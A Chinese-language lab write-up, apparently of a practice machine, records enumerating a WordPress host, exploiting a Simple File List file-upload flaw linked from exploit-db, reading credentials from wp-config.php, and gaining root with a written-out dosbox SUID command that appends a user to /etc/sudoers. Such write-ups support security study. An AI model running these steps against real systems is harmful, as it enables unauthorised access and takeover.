## nmap scannig
- <img width="1482" height="517" alt="image" src="https://github.com/user-attachments/assets/c6d3e519-e201-44db-87fe-d20645c6f21c" />

## 80 port
- dirsearch
  - <img width="1918" height="751" alt="image" src="https://github.com/user-attachments/assets/c34135ed-5104-47c2-b9dc-32beca55ac7a" />
- 網頁是 wordpress
  - <img width="1918" height="836" alt="image" src="https://github.com/user-attachments/assets/ce0fd432-1e21-4fa6-94ab-1c5abc712733" />
- wpscan
  - 掃 plugins 發現 simple-file-list、tutor
    ```
    wpscan --url http://192.168.154.105/ -e u,p
    ```
    - <img width="1918" height="743" alt="image" src="https://github.com/user-attachments/assets/6087299b-676d-4335-a060-a43ec30f9dac" />
- simple-file-list 存在 WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload
  - https://www.exploit-db.com/exploits/48979
  - https://github.com/v3l4r10/Nukem-PG-exploit
- 成功取得 shell
  - <img width="1918" height="557" alt="image" src="https://github.com/user-attachments/assets/ab86298a-d019-4dc0-8bea-27f39785fe6d" />
- 取得 local.txt
  - <img width="898" height="105" alt="image" src="https://github.com/user-attachments/assets/8467da55-30a9-430a-a9f0-3ce40b5580f3" />

## 提權
- 找到 wp-config.php 的路徑是 /srv/http/wp-config.php
  - <img width="977" height="152" alt="image" src="https://github.com/user-attachments/assets/a3c9ee6c-f91a-4a0d-a084-3e44163847e1" />
- 找到 commander 的密碼
  - <img width="1918" height="327" alt="image" src="https://github.com/user-attachments/assets/443b4a04-24c9-49b2-bb17-04f0dffb8fc6" />
- 成功登入 commander
  - <img width="1918" height="152" alt="image" src="https://github.com/user-attachments/assets/78c2d553-5080-4b5e-8010-c1daf89e7f91" />
- linpeas.sh 發現 dosbox 存在 suid
  - <img width="1918" height="747" alt="image" src="https://github.com/user-attachments/assets/5f39a911-4dc9-435e-883f-99f2b23c8fb9" />
- GTFOBins 
  - <img width="1527" height="477" alt="image" src="https://github.com/user-attachments/assets/d564106b-bd90-45a3-8f5a-fb42d3e4e458" />
- 將 commander 加入 /etc/sudoers
  ```
  LFILE='/etc/sudoers'
  ./dosbox -c 'mount c /' -c "echo commander    ALL=(ALL:ALL) ALL >$LFILE" -c exit
  ```
- 成功提權
  - <img width="822" height="106" alt="image" src="https://github.com/user-attachments/assets/bc41583a-09be-46b6-8bc6-cc156a837996" />
- 取得 proof.txt
  - <img width="833" height="55" alt="image" src="https://github.com/user-attachments/assets/5d4e00fb-0af8-4c62-b8ad-796df0eb23a3" />


























































